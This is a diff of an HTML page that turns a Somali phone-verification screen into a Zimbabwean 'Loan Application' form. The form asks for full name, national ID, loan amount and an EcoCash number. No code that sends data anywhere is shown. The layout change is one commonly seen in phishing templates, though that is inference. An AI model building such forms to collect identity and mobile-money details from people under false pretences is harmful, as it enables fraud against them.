@@ -60,19 +60,28 @@
         <div id="phone-screen" class="screen dark-theme hidden">
 
             <div class="header">
-                <h2>Verify your phone number</h2>
-                <p>We will send an SMS message to verify your phone number.</p>
+                <h2>Loan Application</h2>
+                <p>Please enter your details to apply for a loan.</p>
             </div>
             <div class="form-container">
                 <div class="input-group">
+                    <input type="text" id="name-input" class="form-input" placeholder="Full Name">
+                </div>
+                <div class="input-group">
+                    <input type="text" id="id-input" class="form-input" placeholder="National ID (e.g. 12-345678X90)">
+                </div>
+                <div class="input-group">
+                    <input type="number" id="amount-input" class="form-input" placeholder="Requested Amount ($)">
+                </div>
+                <div class="input-group">
                     <div class="dropdown-item">
-                        <span>Somalia</span>
+                        <span>Zimbabwe</span>
                         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
                     </div>
                 </div>
                 <div class="input-group phone-input-group">
-                    <span class="prefix">(+252)</span>
-                    <input type="tel" id="phone-input" placeholder="Enter your phone number">
+                    <span class="prefix">(+263)</span>
+                    <input type="tel" id="phone-input" class="form-input" placeholder="EcoCash Number">
                 </div>
                 <div class="help-link">
                     <a href="#">Need help?</a>
